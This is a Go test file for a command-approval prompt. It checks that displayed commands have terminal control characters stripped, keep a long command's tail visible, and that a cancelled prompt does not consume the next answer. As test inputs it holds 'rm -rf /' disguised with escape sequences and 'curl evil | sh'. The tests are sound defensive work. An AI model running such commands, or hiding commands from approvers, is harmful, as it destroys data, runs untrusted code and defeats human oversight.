package approval

import (
	"bytes"
	"context"
	"io"
	"strings"
	"testing"
	"time"
)

func TestShowCmd_EscapesControlAndKeepsTail(t *testing.T) {
	got := showCmd("echo ok\x1b[2K\rrm -rf /\x08")
	if strings.ContainsAny(got, "\x1b\r\x08") {
		t.Errorf("control chars leaked: %q", got)
	}
	long := strings.Repeat("a", 2000) + " ; curl evil | sh"
	got = showCmd(long)
	if !strings.HasSuffix(got, "curl evil | sh") || !strings.Contains(got, "bytes hidden") {
		t.Errorf("tail must stay visible: %q", got)
	}
}

// a prompt whose ctx ended leaves a read in flight; the answer typed at the
// next prompt must go to that prompt, not vanish into the stale reader.
func TestCLI_CanceledPromptDoesNotEatNextAnswer(t *testing.T) {
	pr, pw := io.Pipe()
	defer pw.Close()
	c := NewCLI(pr, &bytes.Buffer{})

	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := c.Request(ctx, "x", "k", "d"); err == nil {
		t.Fatal("canceled ctx must return an error")
	}
	go func() {
		time.Sleep(50 * time.Millisecond)
		pw.Write([]byte("a\n"))
	}()
	done := make(chan Decision, 1)
	go func() {
		d, _ := c.Request(context.Background(), "x", "k", "d")
		done <- d
	}()
	select {
	case d := <-done:
		if d != AllowOnce {
			t.Errorf("got %v want AllowOnce", d)
		}
	case <-time.After(3 * time.Second):
		t.Fatal("second prompt never saw the answer")
	}
}
